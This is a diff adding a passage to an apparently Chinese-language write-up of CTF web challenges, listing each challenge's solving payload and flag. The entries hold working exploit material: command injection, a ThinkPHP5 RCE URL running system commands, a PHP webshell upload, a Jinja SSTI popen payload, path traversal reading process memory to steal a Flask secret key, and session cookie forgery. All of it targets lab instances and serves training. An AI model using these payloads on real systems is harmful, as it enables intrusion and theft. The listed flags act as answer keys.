@@ -1,3 +1,5 @@
+
+## 难度 1
 ### view_source
 
 ```shell
@@ -366,3 +368,266 @@ echo base64_encode(serialize($e));
 ```
 
 flag: `cyberpeace{4aeb49483011d8e30d982573edd300c5}`
+
+## 难度 2
+
+### command_execution
+
+```
+target=127.0.0.1;grep -r "cyberpeace" /
+```
+
+flag: `cyberpeace{6f845a5b8b4ea9e965f4459c1ffb7ae5}`
+
+### xff_referer
+
+```shell
+$ curl -H "Referer: https://www.google.com" -H "X-Forwarded-For: 123.123.123.123" "http://61.147.171.105:54676/"
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>index</title>
+    <link href="http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css" rel="stylesheet" />
+    <style>
+        body{
+            margin-left:auto;
+            margin-right:auto;
+            margin-TOP:200PX;
+            width:20em;
+        }
+    </style>
+</head>
+<body>
+<p id="demo">ip地址必须为123.123.123.123</p>
+<script>document.getElementById("demo").innerHTML="必须来自https://www.google.com";</script><script>document.getElementById("demo").innerHTML="cyberpeace{242e898a3e5921739cd994a45e805b62}";</script></body>
+</html>
+```
+
+flag: `cyberpeace{242e898a3e5921739cd994a45e805b62}`
+
+### php-rce
+
+```
+http://61.147.171.105:57866/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/flag
+```
+
+flag: `flag{thinkphp5_rce}`
+
+### Web_php_include
+
+```
+http://61.147.171.105:56692/?page=data://text/plain,<?php echo `base64 fl4gisisish3r3.php` ?>
+```
+
+flag: `ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}`
+
+### upload1
+
+```http
+------WebKitFormBoundaryYBxVsEzIO8C3R6nQ
+Content-Disposition: form-data; name="upfile"; filename="x.php"
+Content-Type: image/jpeg
+
+<?php eval($_GET['x']) ?>
+------WebKitFormBoundaryYBxVsEzIO8C3R6nQ--
+```
+
+flag: `cyberpeace{37168f805d005841bc25086834371862}`
+
+### warmup
+
+我只能说 wtf
+
+```
+http://61.147.171.105:57169/?file=source.php?../../../../../ffffllllaaaagggg
+```
+
+flag: `flag{25e7bce6005c4e0c983fb97297ac6e5a}`
+
+### NewsCenter
+
+题坏了
+
+### Web_php_unserialize
+
+```php
+<?php 
+class Demo { 
+    private $file = 'index.php';
+    public function __construct($file) { 
+        $this->file = $file; 
+    }
+    function __destruct() { 
+        echo @highlight_file($this->file, true); 
+    }
+    function __wakeup() { 
+        if ($this->file != 'index.php') { 
+            //the secret is in the fl4g.php
+            $this->file = 'index.php'; 
+        } 
+    } 
+}
+
+$d = new Demo('fl4g.php');
+$s = serialize($d);
+$s = str_replace('O:4:"Demo"', 'O:+4:"Demo"', $s);
+$s = str_replace('"Demo":1:', '"Demo":2:', $s);
+echo $s . "\n";
+echo base64_encode($s) . "\n";
+
+?>
+```
+
+flag: `ctf{b17bd4c7-34c9-4526-8fa8-a0794a197013}`
+
+### web2
+
+```python
+import base64
+import codecs
+
+s = "a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws";
+
+s = codecs.decode(s, 'rot_13')
+s = s[::-1]
+s = base64.b64decode(s).decode('utf-8')
+s = "".join([chr(ord(i) - 1) for i in s])
+s = s[::-1]
+
+print(s)
+```
+
+flag: `flag:{NSCTF_b73d5adfb819c64603d7237fa0d52977}`
+
+### Web_python_template_inejction
+
+```
+http://61.147.171.105:54330/{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()}}
+```
+
+flag: `ctf{f22b6844-5169-4054-b2a0-d95b9361cb57}`
+
+### catcat-new
+
+```
+http://61.147.171.105:65197/info?file=../app.py
+```
+
+```python
+import os
+import uuid
+from flask import Flask, request, session, render_template, Markup
+from cat import cat
+
+flag = ""
+app = Flask(
+    __name__,
+    static_url_path='/', 
+    static_folder='static' 
+)
+app.config['SECRET_KEY'] = str(uuid.uuid4()).replace("-", "") + "*abcdefgh"
+if os.path.isfile("/flag"):
+    flag = cat("/flag")
+    os.remove("/flag")
+
+@app.route('/', methods=['GET'])
+def index():
+    detailtxt = os.listdir('./details/')
+    cats_list = []
+    for i in detailtxt:
+        cats_list.append(i[:i.index('.')])
+ 
+ return render_template("index.html", cats_list=cats_list, cat=cat)
+
+@app.route('/info', methods=["GET", 'POST'])
+def info():
+    filename = "./details/" + request.args.get('file', "")
+    start = request.args.get('start', "0")
+    end = request.args.get('end', "0")
+    name = request.args.get('file', "")[:request.args.get('file', "").index('.')]
+
+    return render_template("detail.html", catname=name, info=cat(filename, start, end))
+ 
+
+
+@app.route('/admin', methods=["GET"])
+def admin_can_list_root():
+    if session.get('admin') == 1:
+        return flag
+    else:
+        session['admin'] = 0
+    return "NoNoNo"
+
+
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', debug=False, port=5637)
+```
+
+然后就是读内存分布，然后模式匹配了
+
+```python
+import requests
+import re
+import dataclasses
+
+@dataclasses.dataclass
+class entry:
+    start: str
+    end: str
+    permission: str
+
+def main() -> None:
+    maps_resp = requests.get('http://61.147.171.105:52143/info?file=../../../../../../proc/self/maps')
+    maps = re.search(r'<p>(.*)</p>', maps_resp.text).group(1)
+    matches = re.findall(r'([0-9a-f]{12})-([0-9a-f]{12}) ([-rwxp]{4})', maps)
+    entries = [entry(start, end, permission) for start, end, permission in matches]
+    
+    for e in entries:
+        if 'r' in e.permission and 'w' in e.permission:
+            start_addr, end_addr = int(e.start, 16), int(e.end, 16)
+            
+            mem_resp = requests.get(f'http://61.147.171.105:52143/info?file=../../../../../../proc/self/mem&start={start_addr}&end={end_addr}')
+            mem = re.search(r'<p>(.*)</p>', mem_resp.text).group(1)
+            matches = re.search(r'[a-f0-9]{32}\*abcdefgh', mem)
+            if matches:
+                print(f"Found in {e}")
+                print(f"Secret key: {matches.group(0)}")
+                break
+            
+
+if __name__ == '__main__':
+    main()
+```
+
+```shell
+$ python3 main.py      
+Found in entry(start='7fc49d4bd000', end='7fc49d5f7000', permission='rw-p')
+Secret key: 8566ab45fb1249688ab31f8b0a00083f*abcdefgh
+```
+
+然后就是 session 伪造，工具一把梭：
+
+```shell
+$ flask-session-cookie-manager3 encode -s '8566ab45fb1249688ab31f8b0a00083f*abcdefgh' -t '{"admin":1}'
+eyJhZG1pbiI6MX0.Z4o6dw.KreVENRWnKHCnu0xvrpIzN8U79E
+
+$ curl -H 'Cookie: session=eyJhZG1pbiI6MX0.Z4o6dw.KreVENRWnKHCnu0xvrpIzN8U79E' 'http://61.147.171.105:52143/admin'
+catctf{Catch_the_c4t_HaHa}
+```
+
+flag: `catctf{Catch_the_c4t_HaHa}`
+
+### simple_js
+
+。。。
+
+```python
+s: str = '\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30'
+
+ans: str = ''.join([chr(int(_)) for _ in s.split(',')])
+
+print(ans)
+```
+
+flag: `Cyberpeace{786OsErtk12}`
